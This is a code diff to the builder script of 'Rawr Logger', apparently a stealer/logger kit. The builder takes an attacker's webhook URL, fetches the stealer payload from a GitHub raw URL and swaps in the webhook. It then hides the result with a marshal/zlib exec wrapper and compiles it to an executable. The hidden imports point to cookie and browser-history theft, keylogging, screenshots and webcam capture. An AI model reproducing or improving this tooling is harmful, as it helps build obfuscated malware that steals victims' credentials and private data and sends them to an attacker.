@@ -14,7 +14,9 @@ except:
     print("Please Rerun The Program")
     time.sleep(1)
 
-os.system(f'cls & title Rawr Logger Builder!')
+os.system('cls' if os.name == 'nt' else 'clear')
+os.system(f'title Rawr Logger Builder!')
+
 Write.Print(Center.XCenter("""
     ____                         __                               
    / __ \____ __      _______   / /   ____  ____ _____ ____  _____
@@ -24,37 +26,57 @@ Write.Print(Center.XCenter("""
                                          /____//____/             
               Made By Jose#0001,TheSoap1#9870                                                                                  
 \n"""), Colors.green_to_yellow, interval=0)
+
 webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
 r = requests.get(webhook)
 if r.status_code == 200:
-         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
-         time.sleep(1) 
-else: 
-    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
-    time.sleep(3) 
+    Write.Print("Webhook Is Working\n", Colors.white_to_green, interval=0.01)
+    time.sleep(1)
+else:
+    Write.Print("Webhook Is Not Working\n", Colors.white_to_red, interval=0.01)
+    time.sleep(3)
     exit()
+
 name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
-code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/main.py")
+
+# New raw URL for main.py file
+raw_url = "https://raw.githubusercontent.com/Randomfry/Rawr-Logger/refs/heads/rawr-logger/main.py"
+code = requests.get(raw_url)
+if code.status_code != 200:
+    Write.Print("Failed to fetch main.py from GitHub\n", Colors.white_to_red, interval=0.01)
+    time.sleep(3)
+    exit()
+
+# Replace the placeholder webhook with the user input webhook
+code_text = code.text.replace("Webhooksss", webhook)
+
 with open(f"{name}.py", 'w', encoding='utf8') as f:
-    f.write(code.text.replace("Webhooksss", webhook))
-Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
-prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.white_to_green, interval=0.01)
-with open(f'{name}.py') as fi:
+    f.write(code_text)
+
+Write.Print("Rawr Logger Was Successfully Built\n", Colors.white_to_green, interval=0.01)
+
+prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Continue", Colors.white_to_green, interval=0.01)
+
+with open(f'{name}.py', 'r', encoding='utf8') as fi:
     pro = fi.read()
     mar = marshal.dumps(pro)
     zlb = zlib.compress(mar)
-    with open(f"{name}.py", 'w') as f:
+    with open(f"{name}.py", 'w', encoding='utf8') as f:
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
-    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
-    if compile == "y":
-        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="platform" --hidden-import="json" --hidden-import="browser_cookie3" --hidden-import="cv2" --hidden-import="re" --hidden-import="uuid" --hidden-import="keyboard" --hidden-import="Chrome" --hidden-import="psutil" --hidden-import="sys" --hidden-import="pynput" --hidden-import="uuid" --hidden-import="PIL" --hidden-import="PIL.ImageGrab" --hidden-import="browser_history" --hidden-import="win32api" {name}.py')
+
+compile = Write.Input("Would You Like To Compile To An Exe? y/n:", Colors.green_to_yellow, interval=0.01)
+if compile.lower() == "y":
+    os.system(f'pyinstaller --onefile --hidden-import=requests --hidden-import=os --hidden-import=socket --hidden-import=threading --hidden-import=platform --hidden-import=json --hidden-import=browser_cookie3 --hidden-import=cv2 --hidden-import=re --hidden-import=uuid --hidden-import=keyboard --hidden-import=Chrome --hidden-import=psutil --hidden-import=sys --hidden-import=pynput --hidden-import=PIL --hidden-import=PIL.ImageGrab --hidden-import=browser_history --hidden-import=win32api {name}.py')
+    try:
         os.remove(f'{name}.spec')
-        Write.Print(f"{name} Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
-        time.sleep(2)
-        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-        time.sleep(3)
-        exit()
-    elif compile == "n":
-      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(3)
-      exit()
+    except:
+        pass
+    Write.Print(f"{name} Was Successfully Compiled In Dist Folder\n", Colors.white_to_green, interval=0.01)
+    time.sleep(2)
+    Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n", Colors.white_to_green, interval=0.01)
+    time.sleep(3)
+    exit()
+elif compile.lower() == "n":
+    Write.Print("Thank You For Using Rawr Logger\n", Colors.white_to_green, interval=0.01)
+    time.sleep(3)
+    exit()
